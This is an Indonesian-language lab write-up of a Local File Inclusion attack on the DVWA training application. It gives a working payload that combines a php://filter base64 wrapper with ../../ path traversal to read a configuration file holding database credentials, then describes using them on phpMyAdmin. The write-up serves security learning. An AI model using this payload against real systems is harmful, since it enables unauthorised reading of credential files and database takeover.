## # KESIMPULAN LOCAL FILE INCLUSION (LFI) - DVWA

## 1. Apa itu LFI?
Local File Inclusion (LFI) adalah kerentanan yang memungkinkan attacker untuk membaca atau mengeksekusi file yang berada di dalam server target melalui parameter URL yang tidak divalidasi dengan benar.

## 2. Parameter Rentan yang Ditemukan
- Parameter: `?page=`
- Lokasi: `/DVWA/vulnerabilities/fi/`

## 3. Payload yang Berhasil
```bash
http://192.168.68.169/DVWA/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../config/config.inc.php
```
## 4. Cara Kerja Payload
| Komponen | Penjelasan |
|----------|-------------|
| `?page=` | Parameter rentan yang menerima input user |
| `php://filter/convert.base64-encode/resource=` | Wrapper PHP untuk membaca file sebagai teks (bukan mengeksekusi) |
| `../../` | Path traversal untuk naik ke direktori root web |
| `config/config.inc.php` | File target yang berisi kredensial database |

## 5. Hasil yang Didapatkan
- Isi file `config.inc.php` dalam bentuk base64
- Setelah di-decode, diperoleh kredensial database:
  - Username: `root`
  - Password: `(kosong)`
 
```bash
http://192.168.68.169/phpmyadmin
```  

## 6. Kesimpulan Akhir
Kerentanan LFI berhasil dieksploitasi untuk membaca file konfigurasi sistem. Dengan kredensial yang didapat, attacker dapat mengakses phpMyAdmin dan berpotensi mengambil alih database server.
